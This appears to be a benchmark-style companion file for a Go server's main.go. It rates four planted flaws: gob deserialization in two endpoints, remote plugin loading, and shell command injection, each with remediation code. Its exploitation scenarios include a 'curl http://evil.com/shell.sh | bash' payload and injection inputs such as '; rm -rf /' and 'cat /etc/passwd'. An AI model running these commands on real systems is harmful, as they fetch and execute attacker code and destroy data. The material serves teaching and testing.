# Security Companion Document: main.go

## Vulnerability: Gob Deserialization of Untrusted Pipeline Import

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L231-L232

### Description
The `/api/pipelines/import` endpoint accepts a base64-encoded payload and, when the format is `gob`, deserializes it using `gob.NewDecoder().Decode()`. While Go's `encoding/gob` is safer than Python's pickle or Java's `ObjectInputStream` because it does not execute arbitrary code during deserialization, it can still be exploited to cause denial of service through crafted payloads that consume excessive memory or CPU, and can instantiate unexpected types if registered via `gob.Register()`.

### Exploitation Scenario
An attacker sends a crafted gob-encoded payload designed to exploit registered types (the application registers `map[string]interface{}` and `[]interface{}`). A malicious payload with deeply nested structures or extremely large collections causes excessive memory allocation, leading to denial of service. In applications with more complex registered types, gob deserialization can instantiate unexpected object graphs.

### Remediation Guidance
Validate and limit the size of decoded data, and prefer JSON for untrusted input:
```go
if len(decoded) > 1024*1024 {
    c.JSON(400, gin.H{"error": "Payload too large"})
    return
}
// Prefer JSON for untrusted input
if err := json.Unmarshal(decoded, &pipelineData); err != nil {
    c.JSON(400, gin.H{"error": "Invalid JSON"})
    return
}
```

### Complexity Rationale
This is rated Moderate because Go's gob encoding is less commonly associated with deserialization attacks than pickle or Java serialization. A reviewer must understand that gob with registered interface types can still be exploited, even though the attack surface is narrower.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools with Go-specific rules may flag `gob.NewDecoder` on user-controlled input, but many tools do not consider gob deserialization a high-risk pattern since Go's type system provides some protection.

---

## Vulnerability: Gob Deserialization in Object Store Retrieval

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L370-L371

### Description
The `/api/objects/:key` endpoint retrieves gob-encoded bytes from the object store and deserializes them using `gob.NewDecoder().Decode()`. The data was originally encoded via the `/api/objects/store` endpoint, but since the raw bytes are stored without integrity verification, an attacker who can manipulate the store can inject crafted gob payloads.

### Exploitation Scenario
An attacker stores a crafted gob payload via `/api/objects/store` that exploits the registered types to create deeply nested or circular data structures. When retrieved, the gob decoder attempts to reconstruct the object graph, consuming excessive memory and causing denial of service.

### Remediation Guidance
Use JSON for the object store and add integrity verification:
```go
import "crypto/hmac"

// Store with HMAC
data, _ := json.Marshal(body.Data)
mac := hmac.New(sha256.New, []byte(secretKey))
mac.Write(data)
signature := mac.Sum(nil)

// Retrieve and verify
mac.Reset()
mac.Write(storedData)
if !hmac.Equal(mac.Sum(nil), storedSignature) {
    c.JSON(400, gin.H{"error": "Integrity check failed"})
    return
}
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans two endpoints and requires understanding that gob-encoded data stored by the application can be tampered with if the attacker can access the store endpoint.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace the data flow from the store endpoint through the in-memory map to the retrieve endpoint and recognize that gob decoding of potentially tampered data is risky.

---

## Vulnerability: Remote Plugin Download and Loading

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L409-L435

### Description
The `/api/plugins/load` endpoint downloads a shared object file from a user-supplied URL using `http.Get()`, saves it to `/tmp/plugins/`, and loads it using `plugin.Open()`. Go's `plugin` package loads shared objects that can execute arbitrary code through init functions and exported symbols. The endpoint also looks up and calls an `Init` function if present.

### Exploitation Scenario
An attacker with engineer credentials hosts a malicious Go plugin compiled as a shared object (`.so` file) that contains an `init()` function executing `exec.Command("sh", "-c", "curl http://evil.com/shell.sh | bash").Run()`. They send a request with the URL pointing to their server. The server downloads, saves, and loads the plugin, executing the malicious init function.

### Remediation Guidance
Use a trusted plugin registry with integrity verification:
```go
var trustedPlugins = map[string]string{
    "analytics": "sha256:abc123...",
    "reporting": "sha256:def456...",
}

func loadPlugin(name, url string) error {
    expected, ok := trustedPlugins[name]
    if !ok {
        return fmt.Errorf("untrusted plugin: %s", name)
    }
    data, _ := io.ReadAll(resp.Body)
    hash := sha256.Sum256(data)
    if fmt.Sprintf("sha256:%x", hash) != expected {
        return fmt.Errorf("integrity check failed")
    }
    // Only then save and load
}
```

### Complexity Rationale
This is rated Nuanced because the vulnerability involves a multi-step process (HTTP download, file write, plugin load, symbol lookup) and is behind role-based access control. A reviewer must understand that Go's `plugin.Open()` executes init functions in the loaded shared object, making it equivalent to arbitrary code execution.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools would need to trace the data flow from `http.Get()` through `os.WriteFile()` to `plugin.Open()` and understand that loading a shared object from an untrusted source constitutes remote code execution. Most Go SAST tools do not have rules for the `plugin` package.

---

## Vulnerability: Shell Command Injection via Script Execution

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L488-L488

### Description
The `/api/scripts/run` endpoint passes user-supplied `script` and `args` values directly to `exec.Command("sh", "-c", body.Script+" "+body.Args)`. This allows an attacker to execute arbitrary shell commands on the server with the privileges of the application process.

### Exploitation Scenario
An attacker with engineer credentials sends `{"script": "cat /etc/passwd", "args": ""}` or uses shell metacharacters like `{"script": "ls", "args": "; rm -rf /"}` to execute arbitrary commands. The server runs the command via `sh -c` and returns the output.

### Remediation Guidance
Never pass user input to shell commands. Use predefined scripts with parameterized arguments:
```go
allowedScripts := map[string]string{
    "list-files": "ls -la",
    "disk-usage": "df -h",
}

scriptCmd, ok := allowedScripts[body.Script]
if !ok {
    c.JSON(400, gin.H{"error": "Unknown script"})
    return
}
cmd := exec.Command("sh", "-c", scriptCmd)
```

### Complexity Rationale
This is rated Obvious because `exec.Command("sh", "-c", userInput)` is a textbook command injection pattern that any security-aware reviewer will immediately recognize.

### Detection Difficulty Rationale
This is rated Easily_Detectable because SAST tools can match `exec.Command` with `sh -c` and user-controlled arguments through straightforward taint analysis.
